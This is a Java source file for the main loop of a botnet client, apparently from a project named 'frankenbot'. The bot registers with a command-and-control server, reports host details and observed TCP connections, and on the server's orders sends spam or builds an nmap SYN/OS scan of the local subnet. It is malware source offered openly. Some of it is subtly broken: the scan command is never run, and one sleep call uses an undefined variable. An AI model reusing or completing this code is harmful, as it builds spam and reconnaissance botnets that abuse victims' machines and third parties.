package ca.franky.frankenbot_bot;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Iterator;

/**
 * Our main class that drivers the bot's actions
 * @author fbegin1
 */
public class BotMain {

    public enum ccResponses { start, sleep, noResponse, spam, scan };

    public static void main(String[] args) {

        /*********************
         * BOT IS IN INIT MODE
         *********************/

        /*
         * Check for arguments given to the bot at startup.
         * Currently, only 'debug' is implemented
         */
        Boolean debug = false;
        for (int i = 0; i < args.length; i++) {
            if (args[i].equals("-debug")) {
                debug = true;
            }
        }

        // Create a new bot object
        Bot myBot = new Bot();
        if (debug) {
            System.out.println("New bot object created");
        }

        // We set up a trust to the SSL cert of the
        // web server running our C&C
        new CC_Connector().setupTrust();

        // We will need to create various report objects
        // to send to the C&C
        CC_DataExchanger myReport = new CC_DataExchanger();

        // This holds replies from the C&C
        String replyFromCC;

        Boolean botStarted = false;
        while (!botStarted) {
            // We attempt to connect to the C&C for the first time
            replyFromCC = myReport.makeInitialConnection(myBot, debug);

            switch (ccResponses.valueOf(replyFromCC)) {
                case start:
                    botStarted = true;
                    if (debug) System.out.println("C&C told me to start");
                    break;

                case sleep:
                    botStarted = false;
                    if (debug)
                        System.out.println("C&C told me to sleep for now");
                    break;

                case noResponse:
                    if (debug)
                        System.out.println("No response from C&C. Sleeping.." +
                                ".");
                    break;

                default:
                    if (debug)
                        System.out.println("C&C responded with something " +
                                "I did not understand: '" + replyFromCC + "'");
                    break;
            }

            if (!botStarted) {
                Tools.sleep(myBot.sleepCycle, myBot.sleepCycleRandomness,
                        debug);
            }
        }

        /**********************
         * BOT IS IN START MODE
         **********************/

        myBot.status = "start";

        // Generate the botID
        if (debug) System.out.println("Determining botID");
        myBot.generateBotID();
        if (debug) System.out.print("This bot UID = " + myBot.id);

        // We build an object containing details about this host
        if (debug) System.out.println("Getting bot details");

        // We send our first real report to the C7C and expect
        // the C&C to reply with our public address
        replyFromCC = myReport.sendHostDetails(myBot, debug);

        // If the C&C replied with our public IP address, we
        // save that information
        if (replyFromCC != null) {
            try {
                myBot.publicIP = InetAddress.getByName(replyFromCC);
                if (debug)
                    System.out.println("C&C informed me that my public ip is " +
                            myBot.publicIP);
            } catch (UnknownHostException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }

        /************************
         * BOT IS IN COMMAND MODE
         ************************/

        myBot.status = "command";

        if (debug) System.out.println("Starting listening thread");

        NICListener listenerThread = new NICListener();
        listenerThread.start();

        while (true) {

            // We gather tcp connection data
            String tcpConnections = "";
            Iterator<String> itr = listenerThread.connectionTriplets.iterator();
            while (itr.hasNext()) {
                tcpConnections += itr.next();
            }

            // We post ongoing reports to the C&C and listen
            // for further orders
            replyFromCC = myReport.sendOngoingReport(myBot, tcpConnections,
                    debug);
            switch (ccResponses.valueOf(replyFromCC)) {

                /*********************
                 * BOT IS SENDING SPAM
                 *********************/

                case spam:
                    if (debug) System.out.println("C&C told me to send spam");
                    Mailer myMailer = new Mailer(myBot);
                    myBot.status = "spam";

                /*
                 * Retrieve spam parameters from C&C
                 */
                    replyFromCC = CC_DataExchanger.requestSpamParameters(myBot,
                            debug);
                    if (replyFromCC != null && replyFromCC.contains("<spam>")) {
                        if (debug) System.out.println("Sending spam");
                        SpamModule.send(replyFromCC, myMailer, debug);
                        // Go back to command mode after having sent spam
                        myBot.status = "command";
                    } else {
                        if (debug) {
                            System.out.println("I should be sending spam but " +
                                    "I received null or garbled spam " +
                                    "parameters from the C&C: ");
                            System.out.println(replyFromCC);
                        }
                    }
                    break;

                /*****************
                 * BOT IS SCANNING
                 *****************/

                case scan:
                    if (debug) System.out.println("C&C told me to scan");
                    myBot.status = "scan";

                    // We pause our tcp listening thread
                    if (debug)
                        System.out.println("Pausing the tcp listening " +
                                "thread");
                    // Pause the thread
                    synchronized (listenerThread) {
                        listenerThread.pleaseWait = true;
                    }

                    // String nmapCommand = "nmap -sS -T sneaky -O " +
                    String nmapCommand = "nmap -sS -O " +
                            myBot.hostNetParams.primaryInterfaceNetwork
                                    .toString().replace("/", "") +
                            HostNetParams.toCIDR(myBot.hostNetParams
                                    .primaryInterfaceSubnetMask);
                    if (debug) System.out.println("Using the following: " +
                            nmapCommand);

                    // Re-start the thread
                    synchronized (listenerThread) {
                        listenerThread.pleaseWait = false;
                    }

                    myBot.status = "command";
                    break;

                /*****************
                 * BOT IS SLEEPING
                 *****************/

                case sleep:
                    if (debug) System.out.println("C&C told me to sleep");
                    Tools.sleep(myBot, sleepCycle, myBot.sleepCycleRandomness,
                            debug);
                    break;

                default:
                    if (debug)
                        System.out.println("C&C responded with something that" +
                                " I did not understand: '" + replyFromCC + "'");
                    break;
            }
        }
    }
}
